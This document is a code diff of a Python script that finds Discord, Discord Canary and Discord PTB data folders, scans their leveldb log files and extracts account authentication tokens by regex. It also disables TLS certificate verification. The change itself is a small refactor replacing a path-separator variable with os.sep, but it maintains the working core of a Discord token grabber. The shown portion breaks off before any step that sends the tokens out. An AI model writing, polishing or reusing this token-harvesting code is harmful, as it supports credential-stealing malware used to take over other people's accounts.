@@ -9,18 +9,16 @@ import ssl
 ssl._create_default_https_context = ssl._create_unverified_context
 
 if os.name == "nt":
-    PATH_SEP = "\\"
     LOCAL = os.getenv("LOCALAPPDATA")
     ROAMING = os.getenv("APPDATA")
 
 if os.name == "posix":
-    PATH_SEP = "/"
     ROAMING = os.path.expanduser("~/Library/Application Support")
 
 PATHS = {
-    "Discord": ROAMING + f"{PATH_SEP}Discord",
-    "Discord Canary": ROAMING + f"{PATH_SEP}discordcanary",
-    "Discord PTB": ROAMING + f"{PATH_SEP}discordptb",
+    "Discord": ROAMING + f"{os.sep}Discord",
+    "Discord Canary": ROAMING + f"{os.sep}discordcanary",
+    "Discord PTB": ROAMING + f"{os.sep}discordptb",
     }
 
 if os.name == "nt":
@@ -33,12 +31,12 @@ if os.name == "nt":
 
 
 def gettokens(path):
-    path += f"{PATH_SEP}Local Storage{PATH_SEP}leveldb"
+    path += f"{os.sep}Local Storage{os.sep}leveldb"
     tokens = []
     for file_name in os.listdir(path):
         if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
             continue
-        lines = [x.strip() for x in open(f"{path}{PATH_SEP}{file_name}", errors="ignore").readlines() if x.strip()]
+        lines = [x.strip() for x in open(f"{path}{os.sep}{file_name}", errors="ignore").readlines() if x.strip()]
         for line in lines:
             for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                 for token in findall(regex, line):
